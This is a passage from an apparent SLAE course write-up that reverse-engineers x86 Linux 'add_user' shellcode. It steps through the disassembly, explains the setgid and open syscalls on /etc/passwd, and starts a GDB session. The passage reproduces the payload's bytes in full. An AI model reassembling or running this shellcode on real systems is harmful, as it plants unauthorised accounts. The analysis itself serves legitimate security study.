</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#000>00000019</span>  <span style=color:#000>682</span><span style=color:#000>F657463</span>        <span style=color:#000>push</span> <span style=color:#000>dword</span> <span style=color:#1c01ce>0x6374652f</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#000>0000001</span><span style=color:#000>E</span>  <span style=color:#1c01ce>89</span><span style=color:#000>E3</span>              <span style=color:#000>mov</span> <span style=color:#000>ebx</span>,<span style=color:#000>esp</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#000>00000020</span>  <span style=color:#000>41</span>                <span style=color:#000>inc</span> <span style=color:#000>ecx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#000>00000021</span>  <span style=color:#000>B504</span>              <span style=color:#000>mov</span> <span style=color:#000>ch</span>,<span style=color:#1c01ce>0x4</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#000>00000023</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#000>00000025</span>  <span style=color:#000>93</span>                <span style=color:#000>xchg</span> <span style=color:#000>eax</span>,<span style=color:#000>ebx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#000>00000026</span>  <span style=color:#000>E828000000</span>        <span style=color:#000>call</span> <span style=color:#000>dword</span> <span style=color:#1c01ce>0x53</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#000>0000002</span><span style=color:#000>B</span>  <span style=color:#1c01ce>6</span><span style=color:#000>D</span>                <span style=color:#000>insd</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#000>0000002</span><span style=color:#000>C</span>  <span style=color:#1c01ce>657461</span>            <span style=color:#000>gs</span> <span style=color:#000>jz</span> <span style=color:#1c01ce>0x90</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#000>0000002</span><span style=color:#000>F</span>  <span style=color:#1c01ce>7370</span>              <span style=color:#000>jnc</span> <span style=color:#1c01ce>0xa1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#000>00000031</span>  <span style=color:#000>6</span><span style=color:#000>C</span>                <span style=color:#000>insb</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#000>00000032</span>  <span style=color:#000>6</span><span style=color:#000>F</span>                <span style=color:#000>outsd</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#000>00000033</span>  <span style=color:#000>69743</span><span style=color:#000>A417A2F6449</span>  <span style=color:#000>imul</span> <span style=color:#000>esi</span>,[<span style=color:#000>edx</span><span style=color:#000>+</span><span style=color:#000>edi</span><span style=color:#000>+</span><span style=color:#1c01ce>0x41</span>],<span style=color:#000>dword</span> <span style=color:#1c01ce>0x49642f7a</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span><span style=color:#000>0000003</span><span style=color:#000>B</span>  <span style=color:#1c01ce>736</span><span style=color:#000>A</span>              <span style=color:#000>jnc</span> <span style=color:#1c01ce>0xa7</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span><span style=color:#000>0000003</span><span style=color:#000>D</span>  <span style=color:#1c01ce>3470</span>              <span style=color:#000>xor</span> <span style=color:#000>al</span>,<span style=color:#1c01ce>0x70</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#000>0000003</span><span style=color:#000>F</span>  <span style=color:#1c01ce>3449</span>              <span style=color:#000>xor</span> <span style=color:#000>al</span>,<span style=color:#1c01ce>0x49</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span><span style=color:#000>00000041</span>  <span style=color:#000>52</span>                <span style=color:#000>push</span> <span style=color:#000>edx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span><span style=color:#000>00000042</span>  <span style=color:#000>633</span><span style=color:#000>A</span>              <span style=color:#000>arpl</span> [<span style=color:#000>edx</span>],<span style=color:#000>di</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span><span style=color:#000>00000044</span>  <span style=color:#000>303</span><span style=color:#000>A</span>              <span style=color:#000>xor</span> [<span style=color:#000>edx</span>],<span style=color:#000>bh</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span><span style=color:#000>00000046</span>  <span style=color:#000>303</span><span style=color:#000>A</span>              <span style=color:#000>xor</span> [<span style=color:#000>edx</span>],<span style=color:#000>bh</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span><span style=color:#000>00000048</span>  <span style=color:#000>3</span><span style=color:#000>A2F</span>              <span style=color:#000>cmp</span> <span style=color:#000>ch</span>,[<span style=color:#000>edi</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span><span style=color:#000>0000004</span><span style=color:#000>A</span>  <span style=color:#1c01ce>3</span><span style=color:#000>A2F</span>              <span style=color:#000>cmp</span> <span style=color:#000>ch</span>,[<span style=color:#000>edi</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span><span style=color:#000>0000004</span><span style=color:#000>C</span>  <span style=color:#1c01ce>62696</span><span style=color:#000>E</span>            <span style=color:#000>bound</span> <span style=color:#000>ebp</span>,[<span style=color:#000>ecx</span><span style=color:#000>+</span><span style=color:#1c01ce>0x6e</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span><span style=color:#000>0000004</span><span style=color:#000>F</span>  <span style=color:#1c01ce>2</span><span style=color:#000>F</span>                <span style=color:#000>das</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span><span style=color:#000>00000050</span>  <span style=color:#000>7368</span>              <span style=color:#000>jnc</span> <span style=color:#1c01ce>0xba</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span><span style=color:#000>00000052</span>  <span style=color:#000>0</span><span style=color:#000>A598B</span>            <span style=color:#000>or</span> <span style=color:#000>bl</span>,[<span style=color:#000>ecx-0x75</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span><span style=color:#000>00000055</span>  <span style=color:#000>51</span>                <span style=color:#000>push</span> <span style=color:#000>ecx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span><span style=color:#000>00000056</span>  <span style=color:#000>FC</span>                <span style=color:#000>cld</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span><span style=color:#000>00000057</span>  <span style=color:#000>6</span><span style=color:#000>A04</span>              <span style=color:#000>push</span> <span style=color:#000>byte</span> <span style=color:#000>+</span><span style=color:#1c01ce>0x4</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span><span style=color:#000>00000059</span>  <span style=color:#000>58</span>                <span style=color:#000>pop</span> <span style=color:#000>eax</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span><span style=color:#000>0000005</span><span style=color:#000>A</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span><span style=color:#000>0000005</span><span style=color:#000>C</span>  <span style=color:#1c01ce>6</span><span style=color:#000>A01</span>              <span style=color:#000>push</span> <span style=color:#000>byte</span> <span style=color:#000>+</span><span style=color:#1c01ce>0x1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span><span style=color:#000>0000005</span><span style=color:#000>E</span>  <span style=color:#1c01ce>58</span>                <span style=color:#000>pop</span> <span style=color:#000>eax</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span><span><span style=color:#000>0000005</span><span style=color:#000>F</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>
</span></span></code></pre></div><p>We can see that the last instruction is a kernel interrupt instruction, indicating that a syscall is going be made. The syscall number is placed in <code>eax</code>. The value is 0x46 which first pushed onto the stack, which is immediately poped into <code>eax</code>. By looking in <code>/usr/include/i386-linux-gnu/asm/unistd_32.h</code> we can see which syscall corresponds to <code>46</code>.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#000>00000000</span>  <span style=color:#000>31</span><span style=color:#000>C9</span>              <span style=color:#000>xor</span> <span style=color:#000>ecx</span>,<span style=color:#000>ecx</span>         <span style=color:#177500>; zero out ecx
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span><span style=color:#177500></span><span style=color:#000>00000002</span>  <span style=color:#000>89</span><span style=color:#000>CB</span>              <span style=color:#000>mov</span> <span style=color:#000>ebx</span>,<span style=color:#000>ecx</span>         <span style=color:#177500>; ebx is now zero
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#177500></span><span style=color:#000>00000004</span>  <span style=color:#000>6</span><span style=color:#000>A46</span>              <span style=color:#000>push</span> <span style=color:#000>byte</span> <span style=color:#000>+</span><span style=color:#1c01ce>0x46</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span><span style=color:#000>00000006</span>  <span style=color:#000>58</span>                <span style=color:#000>pop</span> <span style=color:#000>eax</span>             <span style=color:#177500>; setgid() syscall
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span><span style=color:#177500></span><span style=color:#000>00000007</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>            <span style=color:#177500>; execute syscall
</span></span></span></code></pre></div><p>As we can see below, it&rsquo;s <code>setgid()</code>.</p><pre tabindex=0><code>#define __NR_prof 44
#define __NR_brk 45
#define __NR_setgid 46
#define __NR_getgid 47
#define __NR_signal 48
</code></pre><p>Running <code>man 2 setgid</code> tells us the syntax of the function and its description. The function only has one argument which is set to zero which we can see in the first two instructions.</p><pre tabindex=0><code>[...]
SYNOPSIS
       #include &lt;sys/types.h&gt;
       #include &lt;unistd.h&gt;

       int setgid(gid_t gid);

DESCRIPTION
       setgid() sets the effective group ID of the calling process.  If the caller is the superuser, the real GID and saved set-group-ID are also set.
[...]
</code></pre><p>The next section has a little more going on, we can see that there are twelve bytes being pushed onto the stack. Decoding <code>2f6574632f2f706173737764</code> reveals <code>/etc//passwd</code>. The first instruction also pushes <code>0x5</code> onto the stack, which is again immediately poped into <code>eax</code>. We know from the previous shellcode that this value corresponds to the syscall <code>open()</code>. Now it&rsquo;s clear that this section opens the file <code>/etc/passwd</code> and returns a file descriptor, as seen in the previous payload.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#000>00000009</span>  <span style=color:#000>6</span><span style=color:#000>A05</span>              <span style=color:#000>push</span> <span style=color:#000>byte</span> <span style=color:#000>+</span><span style=color:#1c01ce>0x5</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#000>0000000</span><span style=color:#000>B</span>  <span style=color:#1c01ce>58</span>                <span style=color:#000>pop</span> <span style=color:#000>eax</span>                 <span style=color:#177500>; open() syscall
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#177500></span><span style=color:#000>0000000</span><span style=color:#000>C</span>  <span style=color:#1c01ce>31</span><span style=color:#000>C9</span>              <span style=color:#000>xor</span> <span style=color:#000>ecx</span>,<span style=color:#000>ecx</span>             <span style=color:#177500>; zero out ecx
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#177500></span><span style=color:#000>0000000</span><span style=color:#000>E</span>  <span style=color:#1c01ce>51</span>                <span style=color:#000>push</span> <span style=color:#000>ecx</span>                <span style=color:#177500>; null terminator
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#177500></span><span style=color:#000>0000000</span><span style=color:#000>F</span>  <span style=color:#1c01ce>6873737764</span>        <span style=color:#000>push</span> <span style=color:#000>dword</span> <span style=color:#1c01ce>0x64777373</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#000>00000014</span>  <span style=color:#000>682</span><span style=color:#000>F2F7061</span>        <span style=color:#000>push</span> <span style=color:#000>dword</span> <span style=color:#1c01ce>0x61702f2f</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#000>00000019</span>  <span style=color:#000>682</span><span style=color:#000>F657463</span>        <span style=color:#000>push</span> <span style=color:#000>dword</span> <span style=color:#1c01ce>0x6374652f</span>   <span style=color:#177500>; etc//passwd
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#177500></span><span style=color:#000>0000001</span><span style=color:#000>E</span>  <span style=color:#1c01ce>89</span><span style=color:#000>E3</span>              <span style=color:#000>mov</span> <span style=color:#000>ebx</span>,<span style=color:#000>esp</span>             <span style=color:#177500>; ebx points to filepath
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#177500></span><span style=color:#000>00000020</span>  <span style=color:#000>41</span>                <span style=color:#000>inc</span> <span style=color:#000>ecx</span>                 <span style=color:#177500>; increment ecx, is now 1
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#177500></span><span style=color:#000>00000021</span>  <span style=color:#000>B504</span>              <span style=color:#000>mov</span> <span style=color:#000>ch</span>,<span style=color:#1c01ce>0x4</span>              <span style=color:#177500>; move 0x4 to ecx
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#177500></span><span style=color:#000>00000023</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>                <span style=color:#177500>; execute syscall
</span></span></span></code></pre></div><p>Now comes the juicy part, modifying <code>/etc/passwd</code>. Everything after address <code>00000026</code> looks like gibberish, and the fact that there is a <code>call</code> instruction makes me believe that this is a call-pop technique that we have seen in the previous example. For this last part, I will use GDB to analyze how the program adds a new user to the system.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#000>00000025</span>  <span style=color:#000>93</span>                <span style=color:#000>xchg</span> <span style=color:#000>eax</span>,<span style=color:#000>ebx</span>        <span style=color:#177500>; change the value in eax to ebx and vice verca. ebx now contains the FD
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#177500></span><span style=color:#000>00000026</span>  <span style=color:#000>E828000000</span>        <span style=color:#000>call</span> <span style=color:#000>dword</span> <span style=color:#1c01ce>0x53</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#000>0000002</span><span style=color:#000>B</span>  <span style=color:#1c01ce>6</span><span style=color:#000>D</span>                <span style=color:#000>insd</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#000>0000002</span><span style=color:#000>C</span>  <span style=color:#1c01ce>657461</span>            <span style=color:#000>gs</span> <span style=color:#000>jz</span> <span style=color:#1c01ce>0x90</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#000>0000002</span><span style=color:#000>F</span>  <span style=color:#1c01ce>7370</span>              <span style=color:#000>jnc</span> <span style=color:#1c01ce>0xa1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#000>00000031</span>  <span style=color:#000>6</span><span style=color:#000>C</span>                <span style=color:#000>insb</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#000>00000032</span>  <span style=color:#000>6</span><span style=color:#000>F</span>                <span style=color:#000>outsd</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#000>00000033</span>  <span style=color:#000>69743</span><span style=color:#000>A417A2F6449</span>  <span style=color:#000>imul</span> <span style=color:#000>esi</span>,[<span style=color:#000>edx</span><span style=color:#000>+</span><span style=color:#000>edi</span><span style=color:#000>+</span><span style=color:#1c01ce>0x41</span>],<span style=color:#000>dword</span> <span style=color:#1c01ce>0x49642f7a</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#000>0000003</span><span style=color:#000>B</span>  <span style=color:#1c01ce>736</span><span style=color:#000>A</span>              <span style=color:#000>jnc</span> <span style=color:#1c01ce>0xa7</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#000>0000003</span><span style=color:#000>D</span>  <span style=color:#1c01ce>3470</span>              <span style=color:#000>xor</span> <span style=color:#000>al</span>,<span style=color:#1c01ce>0x70</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#000>0000003</span><span style=color:#000>F</span>  <span style=color:#1c01ce>3449</span>              <span style=color:#000>xor</span> <span style=color:#000>al</span>,<span style=color:#1c01ce>0x49</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#000>00000041</span>  <span style=color:#000>52</span>                <span style=color:#000>push</span> <span style=color:#000>edx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#000>00000042</span>  <span style=color:#000>633</span><span style=color:#000>A</span>              <span style=color:#000>arpl</span> [<span style=color:#000>edx</span>],<span style=color:#000>di</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#000>00000044</span>  <span style=color:#000>303</span><span style=color:#000>A</span>              <span style=color:#000>xor</span> [<span style=color:#000>edx</span>],<span style=color:#000>bh</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#000>00000046</span>  <span style=color:#000>303</span><span style=color:#000>A</span>              <span style=color:#000>xor</span> [<span style=color:#000>edx</span>],<span style=color:#000>bh</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#000>00000048</span>  <span style=color:#000>3</span><span style=color:#000>A2F</span>              <span style=color:#000>cmp</span> <span style=color:#000>ch</span>,[<span style=color:#000>edi</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#000>0000004</span><span style=color:#000>A</span>  <span style=color:#1c01ce>3</span><span style=color:#000>A2F</span>              <span style=color:#000>cmp</span> <span style=color:#000>ch</span>,[<span style=color:#000>edi</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#000>0000004</span><span style=color:#000>C</span>  <span style=color:#1c01ce>62696</span><span style=color:#000>E</span>            <span style=color:#000>bound</span> <span style=color:#000>ebp</span>,[<span style=color:#000>ecx</span><span style=color:#000>+</span><span style=color:#1c01ce>0x6e</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#000>0000004</span><span style=color:#000>F</span>  <span style=color:#1c01ce>2</span><span style=color:#000>F</span>                <span style=color:#000>das</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#000>00000050</span>  <span style=color:#000>7368</span>              <span style=color:#000>jnc</span> <span style=color:#1c01ce>0xba</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#000>00000052</span>  <span style=color:#000>0</span><span style=color:#000>A598B</span>            <span style=color:#000>or</span> <span style=color:#000>bl</span>,[<span style=color:#000>ecx-0x75</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#000>00000055</span>  <span style=color:#000>51</span>                <span style=color:#000>push</span> <span style=color:#000>ecx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#000>00000056</span>  <span style=color:#000>FC</span>                <span style=color:#000>cld</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#000>00000057</span>  <span style=color:#000>6</span><span style=color:#000>A04</span>              <span style=color:#000>push</span> <span style=color:#000>byte</span> <span style=color:#000>+</span><span style=color:#1c01ce>0x4</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span><span style=color:#000>00000059</span>  <span style=color:#000>58</span>                <span style=color:#000>pop</span> <span style=color:#000>eax</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span><span style=color:#000>0000005</span><span style=color:#000>A</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>
</span></span></code></pre></div><p>The binary is stripped from any debug symbols, but we can use <code>readelf</code> to get the entry point of the program. With this information we can debug the program.</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ readelf -h add_user
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF32
  Data:                              2&#39;s complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x8048054
  Start of program headers:          52 (bytes into file)
  Start of section headers:          0 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         1
  Size of section headers:           0 (bytes)
  Number of section headers:         0
  Section header string table index: 0
</code></pre><p>Loading the binary with GDB and setting necessary breakpoints gives shows us the disassembled binary.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#000>dubs3c@slae:</span><span style=color:#000>~/</span><span style=color:#000>SLAE</span><span style=color:#000>/</span><span style=color:#000>EXAM</span><span style=color:#000>/</span><span style=color:#000>github</span><span style=color:#000>/</span><span style=color:#000>assignment_5$</span> <span style=color:#000>gdb</span> -<span style=color:#000>q</span> <span style=color:#000>add_user</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#000>Reading</span> <span style=color:#000>symbols</span> <span style=color:#000>from</span> <span style=color:#000>/</span><span style=color:#000>home</span><span style=color:#000>/</span><span style=color:#000>dubs3c</span><span style=color:#000>/</span><span style=color:#000>SLAE</span><span style=color:#000>/</span><span style=color:#000>EXAM</span><span style=color:#000>/</span><span style=color:#000>github</span><span style=color:#000>/</span><span style=color:#000>assignment_5</span><span style=color:#000>/</span><span style=color:#000>add_user...</span>(<span style=color:#000>no</span> <span style=color:#000>debugging</span> <span style=color:#000>symbols</span> <span style=color:#000>found</span>)...<span style=color:#000>done.</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#000>(</span><span style=color:#000>gdb</span>) <span style=color:#000>b</span> *<span style=color:#1c01ce>0x8048054</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#000>Breakpoint</span> <span style=color:#1c01ce>1</span> <span style=color:#000>at</span> <span style=color:#1c01ce>0x8048054</span>
